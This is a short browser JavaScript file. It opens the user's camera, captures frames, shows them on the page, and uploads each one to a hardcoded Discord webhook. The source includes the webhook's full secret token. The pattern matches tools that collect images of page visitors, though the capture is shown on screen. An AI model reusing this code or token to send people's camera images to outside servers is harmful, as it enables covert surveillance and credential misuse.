document.addEventListener('DOMContentLoaded', async () => {
    const video = document.getElementById('camera');

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // Wait for the video to be loaded before playing
        video.addEventListener('loadedmetadata', () => {
            video.play()
                .then(() => console.log('Video playing'))
                .catch(error => console.error('Error playing video:', error));
        });
    } catch (error) {
        console.error('Error accessing camera:', error);
    }
});

async function captureAndSend() {
    const video = document.getElementById('camera');
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Capture a frame from the video and draw it on the canvas
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Convert the canvas content to a data URL
    const dataUrl = canvas.toDataURL('image/png');

    // Display the captured image on the page
    displayCapturedImage(dataUrl);

    // Call the function to send the image to Discord
    sendToDiscord(dataUrl);
}

async function sendToDiscord(imageDataUrl) {
    const webhookUrl = 'https://discord.com/api/webhooks/1180681736556912640/mtxVNUq7qWq75_9cllm-2wFXSs5e72sgkNVUFcc7Uo-2xo6G56b3Bi1yHTJyEzqnC8LL';

    const formData = new FormData();
    formData.append('file', dataURLtoBlob(imageDataUrl), 'capture.png');

    await fetch(webhookUrl, {
        method: 'POST',
        body: formData
    });

    console.log('-');
}

function displayCapturedImage(dataUrl) {
    const imageElement = document.createElement('img');
    imageElement.src = dataUrl;

    // Append the image to the Captured Images section
    const capturedImagesSection = document.getElementById('capturedImagesSection');
    capturedImagesSection.appendChild(imageElement);
}

// Convert a data URL to a Blob
function dataURLtoBlob(dataUrl) {
    const arr = dataUrl.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);

    while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
    }

    return new Blob([u8arr], { type: mime });
}
